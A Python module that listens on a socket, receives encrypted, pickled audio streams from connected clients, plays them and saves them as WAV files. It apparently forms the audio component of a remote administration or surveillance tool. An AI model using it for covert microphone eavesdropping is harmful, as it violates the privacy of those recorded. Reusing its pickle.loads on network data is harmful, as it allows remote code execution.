import socket
import pickle
import zlib
import time
import pyaudio
import wave
from sys import exit
from Specific.encrypt import Encryption
from Utilities.db_queries import get_module_data


try:
	# Address
	info = get_module_data()
	# Settings
	audio_settings = []
	# Socket
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind((info[1], int(info[3].split(',')[2])))
	s.listen()
except:
	exit(0)


def audio_info():
	info = '\n'
	
	for index, setting in enumerate(audio_settings):
		info += f'    - {setting[0]}[{index}]'
		if len(audio_settings) > 1 and index + 1 != len(audio_settings):
			info += '\n'
	
	if len(audio_settings) == 0:
		info = 'False'
		
	return info


def set_audio_settings(index):
	global audio_settings

	try:
		if index == '*':
			for audio_setting in audio_settings:
				audio_setting[1].close()
			return 'Audios closed!'
		else:
			audio_settings[int(index)][1].close()
			return 'Audio closed!'
	except:
		return 'Audio failed to close.'


def Audio(encoding, path, user):
	try:
		global audio_settings

		CHUNK = 81920
		FORMAT = pyaudio.paInt16
		CHANNELS = 2
		RATE = 44100
		headersize = 10
		new_msg = True
		msg_len = 0
		full_msg = b''
		msg = b'next'

		e = Encryption()
		client, addr = s.accept()

		u = (user, client, addr)
		audio_settings.append(u)

		real_msg = pickle.dumps(msg)
		real_msg = zlib.compress(real_msg, 1)
		real_msg = e.do_encrypt(real_msg)
		final_msg = bytes(f'{len(real_msg):<{headersize}}', encoding) + real_msg
		client.send(final_msg)

		p = pyaudio.PyAudio()
		stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=False, output=True, frames_per_buffer=CHUNK)
		frames = []

		while True:
			try:
				client_msg = client.recv(81920)

				if new_msg:
					msg_len = int(client_msg[:headersize])
					new_msg = False

				full_msg += client_msg

				if len(full_msg)-headersize == msg_len:
					frame = e.do_decrypt(full_msg[headersize:])
					frame = zlib.decompress(frame)
					frame = pickle.loads(frame)

					stream.write(frame)
					frames.append(frame)

					real_msg = pickle.dumps(msg)
					real_msg = zlib.compress(real_msg, 1)
					real_msg = e.do_encrypt(real_msg)
					final_msg = bytes(f'{len(real_msg):<{headersize}}', encoding) + real_msg
					client.send(final_msg)
					
					new_msg = True
					msg_len = 0
					full_msg = b''
			except:
				audio_settings.remove(u)
				waveFile = wave.open(f'{path}/{time.strftime("%Y-%m-%d (%H-%M-%S)")}.wav', 'wb')
				waveFile.setnchannels(CHANNELS)
				waveFile.setsampwidth(p.get_sample_size(FORMAT))
				waveFile.setframerate(RATE)
				waveFile.writeframes(b''.join(frames))
				waveFile.close()
				exit(0)
	except:
		exit(0)